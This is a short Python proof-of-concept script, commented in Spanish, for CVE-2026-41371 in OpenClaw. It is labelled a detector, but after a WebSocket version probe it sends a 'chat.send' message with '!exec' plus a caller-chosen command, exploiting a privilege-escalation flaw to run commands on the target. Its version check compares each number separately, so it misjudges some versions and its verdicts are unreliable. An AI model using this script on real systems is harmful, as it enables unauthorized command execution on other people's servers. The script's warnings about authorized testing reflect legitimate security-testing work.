#!/usr/bin/env python3
"""
CVE-2026-41371 - OpenClaw Privilege Escalation Detector
Nivel: Medio-Alto
ADVERTENCIA: Solo para entornos controlados con autorizacion
"""

import json
import sys

try:
    import websocket
except ImportError:
    print("[!] websocket-client no instalado. Ejecuta: pip install websocket-client")
    sys.exit(1)


def detect_vulnerable_version(target_url: str) -> bool | None:
    """Detect if target OpenClaw version is vulnerable to CVE-2026-41371."""
    try:
        ws = websocket.create_connection(target_url, timeout=5)
        probe = {"type": "version"}
        ws.send(json.dumps(probe))
        response = ws.recv()
        data = json.loads(response)
        version = data.get("version", "unknown")

        if version:
            major, minor, patch = version.split(".")
            if int(major) <= 2 and int(minor) <= 4 and int(patch) < 1:
                print(f"[!] Version {version} - potencialmente VULNERABLE")
                return True
            else:
                print(f"[+] Version {version} - puede estar parcheado")
                return False
    except Exception as e:
        print(f"[-] No se pudo conectar: {e}")
        return None


def test_privilege_escalation(target_url: str, command: str = "whoami") -> dict | None:
    """
    Test privilege escalation via chat.send (CVE-2026-41371).
    WARNING: Solo para testing en entornos autorizados.
    """
    try:
        ws = websocket.create_connection(target_url)
        payload = {
            "type": "chat.send",
            "content": f"!exec {command}",
            "channel": "general",
        }
        ws.send(json.dumps(payload))
        response = ws.recv()
        result = json.loads(response)
        print(f"[+] Respuesta: {result}")
        return result
    except Exception as e:
        print(f"[-] Error: {e}")
        return None


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Uso: python3 cve_41371.py <ws://target:8080/ws>")
        sys.exit(1)

    target = sys.argv[1]
    print(f"=== CVE-2026-41371 Detector ===")
    print(f"Target: {target}\n")

    vulnerable = detect_vulnerable_version(target)
    if vulnerable:
        print("\n[!] Objetivo vulnerable - ejecutando prueba de escalacion...")
        test_privilege_escalation(target)
    elif vulnerable is False:
        print("\n[+] Objetivo parece parcheado")
    else:
        print("\n[-] No se pudo determinar el estado")
